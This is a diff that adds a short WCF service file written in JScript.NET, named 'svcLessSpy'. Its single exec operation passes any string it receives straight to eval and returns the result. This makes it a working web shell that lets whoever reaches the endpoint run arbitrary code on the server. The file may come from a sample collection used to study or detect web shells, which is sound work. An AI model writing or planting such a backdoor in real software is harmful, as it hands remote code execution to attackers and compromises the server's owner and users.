@@ -1,0 +1,13 @@
+﻿<%@ ServiceHost Language="JScript" Debug="true" Service="svcLessSpy"%>
+import System;
+import System.Web;
+import System.IO;
+import System.ServiceModel;
+import System.Text;
+ServiceContractAttribute public class svcLessSpy 
+{
+	OperationContractAttribute public function exec(Ivan : String) : String
+	{
+		return eval(Ivan);
+	}
+}
